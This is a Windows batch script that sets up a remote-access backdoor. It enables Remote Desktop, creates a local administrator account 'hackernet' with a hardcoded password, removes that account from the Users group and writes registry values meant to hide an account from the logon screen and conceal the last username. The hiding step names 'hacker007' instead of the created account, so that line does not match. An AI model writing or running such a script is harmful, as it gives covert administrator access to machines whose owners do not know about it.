@echo off

REM ****************
REM Enable Remote Desktop
REM ****************
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM ***************
REM Create a HIDDEN USER usr= hackernet, pass= hackern3t@123
REM ***************
net user hackernet hackern3t@123 /add
net localgroup "Administrators" /add hackernet
net localgroup "Users" /del hackernet
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker007 /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f